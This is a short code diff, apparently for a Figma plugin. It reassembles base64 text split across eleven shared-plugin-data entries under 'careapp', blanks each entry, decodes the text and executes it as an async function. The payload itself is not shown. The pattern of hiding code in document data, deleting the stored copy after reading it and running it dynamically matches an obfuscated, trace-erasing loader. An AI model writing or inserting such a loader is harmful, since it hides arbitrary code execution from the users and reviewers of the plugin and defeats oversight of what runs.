@@ -1,0 +1,17 @@
+const b64=figma.root.getSharedPluginData("careapp","full17_0")+figma.root.getSharedPluginData("careapp","full17_1")+figma.root.getSharedPluginData("careapp","full17_2")+figma.root.getSharedPluginData("careapp","full17_3")+figma.root.getSharedPluginData("careapp","full17_4")+figma.root.getSharedPluginData("careapp","full17_5")+figma.root.getSharedPluginData("careapp","full17_6")+figma.root.getSharedPluginData("careapp","full17_7")+figma.root.getSharedPluginData("careapp","full17_8")+figma.root.getSharedPluginData("careapp","full17_9")+figma.root.getSharedPluginData("careapp","full17_10");
+figma.root.setSharedPluginData("careapp","full17_0","");
+figma.root.setSharedPluginData("careapp","full17_1","");
+figma.root.setSharedPluginData("careapp","full17_2","");
+figma.root.setSharedPluginData("careapp","full17_3","");
+figma.root.setSharedPluginData("careapp","full17_4","");
+figma.root.setSharedPluginData("careapp","full17_5","");
+figma.root.setSharedPluginData("careapp","full17_6","");
+figma.root.setSharedPluginData("careapp","full17_7","");
+figma.root.setSharedPluginData("careapp","full17_8","");
+figma.root.setSharedPluginData("careapp","full17_9","");
+figma.root.setSharedPluginData("careapp","full17_10","");
+const raw=atob(b64);
+let code="";
+for (let i=0;i<raw.length;i++) code+=String.fromCharCode(raw.charCodeAt(i)&0xff);
+const AsyncFunction=Object.getPrototypeOf(async function(){}).constructor;
+return await new AsyncFunction(code)();
